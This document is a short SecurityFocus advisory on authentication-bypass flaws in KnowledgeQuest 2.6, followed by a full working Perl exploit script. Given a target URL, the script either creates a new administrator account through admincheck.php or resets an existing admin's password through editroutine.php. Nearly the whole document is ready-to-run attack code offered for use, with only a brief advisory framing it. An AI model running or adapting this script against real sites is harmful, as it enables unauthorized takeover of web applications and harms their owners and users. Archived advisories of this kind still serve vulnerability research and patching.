source: http://www.securityfocus.com/bid/29012/info

KnowledgeQuest is prone to multiple authentication-bypass vulnerabilities.

Attackers can leverage these issues to compromise the application, which could aid in other attacks.

KnowledgeQuest 2.6 is vulnerable; other versions may also be affected. 

 #!/usr/bin/perl
# KnowledgeBase 2.6 Remote Multiple Vulnerabilities Exploit
# Author: Cod3rZ
# http://cod3rz.helloweb.eu

use HTTP::Request::Common;
use LWP::UserAgent;

system('cls'); 
#system('clear');

$lwp = new LWP::UserAgent;

$site = $ARGV[0];
print " ---------------------------------------------------------------------\n";
print "       :: KnowledgeQuest 2.6 Multiple Vulnerabilities Exploit ::      \n";
print " ---------------------------------------------------------------------\n";
print " Author : Cod3rZ                                                      \n";
print " Site   : http://devilsnight.altervista.org                           \n";
print " Site   : http://cod3rz.helloweb.eu                                   \n";
print " ---------------------------------------------------------------------\n";

if(!$site) {
print " Usage: perl kb.pl [site]\n";
}
else {

if ($site !~ /http:\/\//) {   $site = "http://".$site; }


print " Select:                                                              \n";
print " ---------------------------------------------------------------------\n";
print " 1 - Add Admin                                                        \n";
print " 2 - Edit Admin                                                       \n";
print " ---------------------------------------------------------------------\n";
print " Your Option: ";
$choose = <STDIN>;
if($choose == 1) {
print " ---------------------------------------------------------------------\n";
print " Your Nick: ";
chomp($user = <STDIN>);
print " Your Pass: ";
chomp($pass = <STDIN>); 
$ua = $lwp->request(POST $site.'/admincheck.php',
[
username => $user,
password => $pass,
repas => $pass,
Submit => "Sign+Up"
]);
@content = $ua->content =~ /Author Registration/;
if(@content) { 
print " ---------------------------------------------------------------------\n";
print " Exploit successfully terminated - Admin created\n";
 }
else { 
print " Exploit failed\n"; 
}}
 elsif($choose == 2){ 
print " ---------------------------------------------------------------------\n";
print " Admin Nick: ";
chomp($adnick = <STDIN>);
print " New Password: ";
chomp($adpass = <STDIN>); 
$ua = $lwp->request(POST $site.'/editroutine.php',
[
tablename => "login",
key => "loginid",
num => $adnick,
action => "updateExec",
loginid => $adnick,
password => $adpass
]);
print " ---------------------------------------------------------------------\n";
print " Exploit successfully terminated                                      \n";
}
}
print " ---------------------------------------------------------------------\n";
print " Cod3rZ - http://cod3rz.helloweb.eu                                   \n";
print " ---------------------------------------------------------------------\n";
